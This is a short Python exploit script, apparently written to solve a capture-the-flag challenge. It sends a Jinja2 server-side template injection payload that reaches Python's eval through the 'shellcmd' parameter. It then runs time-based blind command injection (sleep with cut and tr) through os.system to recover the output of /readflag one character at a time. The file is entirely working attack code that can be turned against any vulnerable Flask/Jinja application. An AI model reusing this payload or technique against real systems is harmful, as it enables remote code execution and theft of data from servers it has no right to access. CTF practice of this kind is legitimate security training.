import requests
import string
import time
import lipsum

url = 'http://ip:port/shell?shellcmd={{lipsum|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("eval")(request|attr("POST")|attr("get")("shell"))}}'
charset = string.ascii_letters+string.digits+'{'+'}'+'-'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close'
}
cookies = {
    'session':'your sesssion value'
}

session = requests.Session()
session.headers.update(headers)
session.cookies.update(cookies)

def get_readflag_out():
    output = ''
    i = 1
    while True:
        for c in charset:
            command = f"sleep $(/readflag | cut -c {i} | tr {c} 8)"
            shell = f'__import__("os").system("{command}")'
            data = {
                "shell":shell
            }
            start_time = time.time()
            response = session.post(url,data)
            end_time = time.time()

            time_token = end_time-start_time
            
            if time_token>8.0:
                print("found char:", c)
                output += c
                break
        
        if len(output)==i:
            print(output)
            i+=1
        else:
            break
    return output

output = get_readflag_out()
print(output)